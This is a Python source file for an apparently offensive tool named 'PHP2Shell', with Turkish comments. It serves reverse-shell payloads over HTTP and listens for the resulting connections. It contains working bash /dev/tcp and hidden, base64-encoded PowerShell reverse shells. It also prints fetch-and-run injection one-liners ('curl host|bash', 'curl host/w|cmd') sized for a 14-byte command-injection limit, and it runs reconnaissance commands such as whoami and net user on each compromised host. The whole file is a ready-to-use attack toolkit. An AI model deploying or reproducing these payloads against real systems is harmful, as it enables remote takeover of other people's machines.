#!/usr/bin/env python3
"""
Reverse shell listener + HTTP stager — Linux (bash) ve Windows (PowerShell).

:80   stager (curl a|bash veya curl a/w|cmd)
:4444 listener

    python3 shell_server.py --lhost 10.0.0.1 --lport 4444
"""

import argparse
import os
import socket
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer



# ==========================================================================
# CONFIGURATION
# ==========================================================================

def get_local_ip() -> str:
    """Lokal IP adresini tespit et."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "0.0.0.0"

# Global config
CONFIG = {
    "lhost": os.environ.get("LHOST", get_local_ip()),
    "lport": int(os.environ.get("LPORT", "4444")),
    "stager_port": int(os.environ.get("STAGER_PORT", "80")),
    "out_file": os.environ.get("OUT_FILE", "shell_output.txt"),
    "detected_os": None,  # Shell baglantisinda tespit edilir
    "connection_received": False,
}

# ==========================================================================
# REVERSE SHELL PAYLOADS
# ==========================================================================

def get_linux_stager(lhost: str, lport: int) -> str:
    """Linux bash reverse shell script."""
    return f"""#!/bin/bash
# PHP2Shell Linux Reverse Shell
exec 5<>/dev/tcp/{lhost}/{lport}
cat <&5 | while read line; do
    out=$($line 2>&1)
    echo "$out" >&5
done
"""

def get_linux_bash_oneliner(lhost: str, lport: int) -> str:
    """Linux bash -i reverse shell (interactive)."""
    return f"""#!/bin/sh
curl -s http://{lhost}/prebash >/dev/null 2>&1
bash >& /dev/tcp/{lhost}/{lport} 0>&1
curl -s http://{lhost}/postbash >/dev/null 2>&1
"""

def get_windows_stager(lhost: str, lport: int) -> str:
    """Windows PowerShell reverse shell script (batch wrapper)."""
    # Batch script olarak gelir, PowerShell calistirir
    ps_payload = f'''$c=New-Object Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()'''
    
    # Base64 encode et (Windows icin)
    import base64
    ps_b64 = base64.b64encode(ps_payload.encode('utf-16-le')).decode()
    
    return f"""@echo off
REM PHP2Shell Windows Reverse Shell
curl -s http://{lhost}/preps >nul 2>&1
powershell -nop -w hidden -e {ps_b64}
curl -s http://{lhost}/postps >nul 2>&1
"""

def get_windows_powershell_direct(lhost: str, lport: int) -> str:
    """Windows PowerShell dogrudan reverse shell."""
    return f'''$c=New-Object Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()'''

# ==========================================================================
# HTTP STAGER SERVER
# ==========================================================================

class StagerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        lhost = CONFIG["lhost"]
        lport = CONFIG["lport"]
        
        path = self.path.split("?")[0]  # Query string'i kaldir
        
        log(f"[stager] GET {path} from {self.client_address}")
        
        # Path'e gore payload sec
        # KISA YOLLAR: 14 byte komut limiti icin exploit "curl a/w|cmd"
        # (Windows) ve "curl a|bash" (Linux, kok yol) kullanir.
        if path == "/" or path == "/linux" or path == "/bash" or path == "/l":
            # Linux stager
            body = get_linux_bash_oneliner(lhost, lport).encode()
            content_type = "text/plain"
        elif path == "/linux-exec":
            body = get_linux_stager(lhost, lport).encode()
            content_type = "text/plain"
        elif path == "/windows" or path == "/win" or path == "/cmd" or path == "/w":
            # Windows stager (batch script)
            body = get_windows_stager(lhost, lport).encode()
            content_type = "text/plain"
        elif path == "/ps" or path == "/powershell":
            # PowerShell dogrudan
            body = get_windows_powershell_direct(lhost, lport).encode()
            content_type = "text/plain"
        elif path in ["/prebash", "/postbash", "/preps", "/postps"]:
            # Marker endpoint'ler
            body = b"ok\n"
            content_type = "text/plain"
        elif path == "/auto":
            # User-Agent'a gore otomatik sec
            ua = self.headers.get("User-Agent", "").lower()
            if "windows" in ua or "powershell" in ua:
                body = get_windows_stager(lhost, lport).encode()
            else:
                body = get_linux_bash_oneliner(lhost, lport).encode()
            content_type = "text/plain"
        else:
            # Varsayilan: Linux
            body = get_linux_bash_oneliner(lhost, lport).encode()
            content_type = "text/plain"
        
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


# ==========================================================================
# TCP LISTENER
# ==========================================================================

def log(text: str):
    """Log mesaji yaz."""
    print(text, flush=True)
    try:
        with open(CONFIG["out_file"], "a") as f:
            f.write(text + "\n")
    except OSError:
        pass


def detect_os_from_shell(conn: socket.socket) -> str:
    """Shell baglantisi uzerinden OS tespit et."""
    try:
        conn.settimeout(3)
        
        # Universal probe: hem Linux hem Windows'ta calisan komutlar
        # echo komutu her iki platformda da var
        conn.sendall(b"echo $OSTYPE 2>/dev/null || echo %OS% 2>nul\n")
        time.sleep(1.5)
        
        data = b""
        conn.settimeout(2)
        try:
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        
        response = data.decode("latin1", errors="replace").lower()
        log(f"[detect] OS probe response: {response[:200]!r}")
        
        # Windows belirtecleri
        if any(x in response for x in ["windows_nt", "windows", "ps ", "c:\\"]):
            return "windows"
        
        # Linux belirtecleri
        if any(x in response for x in ["linux", "darwin", "gnu", "uid=", "/bin", "/home"]):
            return "linux"
        
        # Ikinci deneme
        conn.sendall(b"ver 2>nul || uname -s 2>/dev/null\n")
        time.sleep(1)
        
        data = b""
        try:
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        
        response = data.decode("latin1", errors="replace").lower()
        
        if "microsoft" in response or "windows" in response:
            return "windows"
        if "linux" in response:
            return "linux"
        
    except Exception as e:
        log(f"[detect] Hata: {e}")
    
    return "linux"  # Varsayilan


def get_test_commands(os_type: str) -> list:
    """OS'e gore test komutlari dondur."""
    if os_type == "windows":
        return [
            "whoami",
            "hostname",
            "cd",
            "systeminfo | findstr /B /C:\"OS\"",
            "ipconfig | findstr IPv4",
            "net user",
            "echo SHELL_OK_MARKER_1337",
        ]
    else:  # linux
        return [
            "id",
            "whoami",
            "hostname",
            "pwd",
            "cat /etc/os-release | head -n 1",
            "ls -la /var/www/html 2>/dev/null || ls -la",
            "echo SHELL_OK_MARKER_1337",
        ]


def listener():
    """TCP listener - shell baglantilarini kabul et."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", CONFIG["lport"]))
    srv.listen(5)
    log(f"[listener] Dinleniyor: 0.0.0.0:{CONFIG['lport']}")
    
    while True:
        try:
            conn, addr = srv.accept()
            log(f"\n{'='*60}")
            log(f"[listener] SHELL BAGLANTISI: {addr}")
            log(f"{'='*60}")
            CONFIG["connection_received"] = True
            
            # OS tespit et
            log("[*] Hedef OS tespit ediliyor...")
            detected_os = detect_os_from_shell(conn)
            CONFIG["detected_os"] = detected_os
            log(f"[+] Tespit edilen OS: {detected_os.upper()}")
            
            # Test komutlarini calistir
            conn.settimeout(3)
            buf = b""
            
            def drain(wait=1.5):
                nonlocal buf
                conn.settimeout(wait)
                try:
                    while True:
                        data = conn.recv(65536)
                        if not data:
                            break
                        buf += data
                except (socket.timeout, OSError):
                    pass
            
            drain(1)
            
            test_cmds = get_test_commands(detected_os)
            for cmd in test_cmds:
                log(f"[shell] $ {cmd}")
                try:
                    conn.sendall((cmd + "\n").encode())
                except OSError as e:
                    log(f"[listener] Gonderim hatasi: {e}")
                    break
                drain(1.5)
            
            # Exit
            try:
                if detected_os == "windows":
                    conn.sendall(b"exit\n")
                else:
                    conn.sendall(b"exit\n")
            except OSError:
                pass
            drain(1)
            
            # Sonuclari goster
            out = buf.decode("latin1", errors="replace")
            log("\n===== SHELL OUTPUT BEGIN =====")
            log(out)
            log("===== SHELL OUTPUT END =====\n")
            
            # Basari kontrolu
            if "SHELL_OK_MARKER_1337" in out:
                if detected_os == "windows" and "whoami" in out.lower():
                    log("RESULT: WINDOWS SHELL CONFIRMED (whoami + marker)")
                elif "uid=" in out:
                    log("RESULT: LINUX SHELL CONFIRMED (uid + marker)")
                else:
                    log("RESULT: SHELL CONFIRMED (marker found)")
            else:
                log("RESULT: SHELL CONNECTION RECEIVED (marker not found)")
            
            conn.close()
            
        except Exception as e:
            log(f"[listener] Hata: {e}")
            continue


# ==========================================================================
# MAIN
# ==========================================================================

BANNER = r"""
 ____  _   _ ____  ____    _          _ _ 
|  _ \| | | |  _ \|___ \  | |        | | |
| |_) | |_| | |_) | __) |_| |__   ___| | |
|  __/|  _  |  __/ / __/|_   __| / _ \ | |
| |   | | | | |   | |___| | |   |  __/ | |
|_|   |_| |_|_|   |_____| |_|    \___|_|_|
                                          
  Cross-Platform Shell Server v2.0
  Supports: Linux (bash) & Windows (PowerShell)
"""

def main():
    print(BANNER)
    
    ap = argparse.ArgumentParser(description="PHP2Shell Cross-Platform Shell Server")
    ap.add_argument("--lhost", default=get_local_ip(),
                    help=f"Listener IP (varsayilan: {get_local_ip()})")
    ap.add_argument("--lport", type=int, default=4444,
                    help="Listener port (varsayilan: 4444)")
    ap.add_argument("--stager-port", type=int, default=80,
                    help="HTTP stager port (varsayilan: 80)")
    ap.add_argument("--out-file", default="shell_output.txt",
                    help="Output dosyasi")
    args = ap.parse_args()
    
    CONFIG["lhost"] = args.lhost
    CONFIG["lport"] = args.lport
    CONFIG["stager_port"] = args.stager_port
    CONFIG["out_file"] = args.out_file
    
    # Output dosyasini temizle
    try:
        os.unlink(args.out_file)
    except OSError:
        pass
    
    print(f"[*] Konfigürasyon:")
    print(f"    LHOST: {CONFIG['lhost']}")
    print(f"    LPORT: {CONFIG['lport']}")
    print(f"    Stager Port: {CONFIG['stager_port']}")
    print()
    print("[*] Stager Endpoint'leri:")
    print(f"    Linux:   http://{CONFIG['lhost']}:{CONFIG['stager_port']}/  (kisa: /l)")
    print(f"    Linux:   http://{CONFIG['lhost']}:{CONFIG['stager_port']}/linux")
    print(f"    Windows: http://{CONFIG['lhost']}:{CONFIG['stager_port']}/w  (kisa yol)")
    print(f"    Windows: http://{CONFIG['lhost']}:{CONFIG['stager_port']}/windows")
    print(f"    Auto:    http://{CONFIG['lhost']}:{CONFIG['stager_port']}/auto")
    print()
    print("[*] Exploit Komutlari (14 byte limiti):")
    print(f"    Linux:   curl {CONFIG['lhost']}|bash")
    print(f"    Windows: curl {CONFIG['lhost']}/w|cmd")
    print()
    
    # HTTP stager baslat
    try:
        http = HTTPServer(("0.0.0.0", CONFIG["stager_port"]), StagerHandler)
        threading.Thread(target=http.serve_forever, daemon=True).start()
        log(f"[stager] HTTP dinleniyor: 0.0.0.0:{CONFIG['stager_port']}")
    except PermissionError:
        print(f"[!] Port {CONFIG['stager_port']} icin yetki yok, sudo ile calistirin")
        print(f"    veya --stager-port ile farkli port kullanin")
        sys.exit(1)
    except OSError as e:
        print(f"[!] Stager baslatma hatasi: {e}")
        sys.exit(1)
    
    # TCP listener baslat
    try:
        listener()
    except KeyboardInterrupt:
        print("\n[*] Kapatiliyor...")
        sys.exit(0)


if __name__ == "__main__":
    main()
